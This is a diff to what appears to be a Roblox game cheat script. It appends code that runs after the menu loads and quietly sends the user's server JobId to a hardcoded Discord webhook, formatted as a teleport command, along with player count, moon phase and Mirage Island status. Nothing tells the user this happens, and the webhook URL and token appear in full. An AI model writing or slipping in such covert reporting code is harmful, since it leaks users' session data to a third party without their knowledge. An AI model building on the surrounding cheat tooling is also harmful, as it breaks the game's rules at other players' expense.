@@ -7317,3 +7317,70 @@ MiscTab:AddButton({
 })
 
 OrionLib:Init()
+
+local P = {2753915549,4442272183,7449423635};
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+    shared.Min = i
+end
+
+game:GetService("RunService").Heartbeat:Connect(function()
+    for i,v in pairs(P) do
+        if v == game.PlaceId then
+            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
+                shared.Mystic = "Spawn"
+            else
+                shared.Mystic = "Not spawn"
+            end
+            
+            if game:GetService("Lighting").Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149431" then
+                shared.FullMoon = tostring("100%".." | ".."Full Moon")
+            elseif game:GetService("Lighting").Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149052" then
+                shared.FullMoon = tostring("75%")
+            elseif game:GetService("Lighting").Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709143733" then
+                shared.FullMoon = tostring("50%")
+            elseif game:GetService("Lighting").Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709150401" then
+                shared.FullMoon = tostring("25%")
+            elseif game:GetService("Lighting").Sky.MoonTextureId == "http://www.roblox.com/asset/?id=9709149680" then
+                shared.FullMoon = tostring("15%")
+            else
+                shared.FullMoon = tostring("0%")
+            end
+        end
+    end
+end)
+
+for i,v in pairs(P) do
+    if v == game.PlaceId then
+        local url =
+            "https://discord.com/api/webhooks/1137355222419771513/YE4AsobrghqBtgOLSsjGRo_dKf0To97oLwCi_OTP2nz79zMajDDKYPQUgEr8UQz7P5Oq"
+        local data = {
+            ["embeds"] = {
+                {
+                    ["description"] = "**Mirage Island!**\n```lua\n"..tostring('game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport","'..game.JobId..'")').."\n```",
+                    ["color"] = 663255,
+                    ["fields"] = {
+                        {["name"] = "**Players**",["value"] = "```yaml\n"..shared.Min.."/"..game:GetService("Players").MaxPlayers.."\n```",["inline"] = true,},
+                        {["name"] = "**🌕Full Moon :**",["value"] = "```yaml\n"..shared.FullMoon.."\n```",["inline"] = true,},
+                        {["name"] = "**🌌Mirage Island :**",["value"] = "```lua\n"..tostring(shared.Mystic).."\n```",["inline"] = true,}
+                    },
+                    ["footer"] = {
+                        ["text"] = "Webhook",
+                        ["icon_url"] = ""
+                    },
+                    ["timestamp"] = DateTime.now():ToIsoDate(),
+                    ["thumbnail"] = {
+                        ["url"] = "https://tr.rbxcdn.com/9b78e73ecff59b92a0d23e0cf4b40292/150/150/Image/Png"
+                    }
+                }
+            },
+        }
+        local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+        local headers = {
+            ["content-type"] = "application/json"
+        }
+        request = http_request or request or HttpPost or syn.request
+        local R = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+        request(R)
+    end
+end
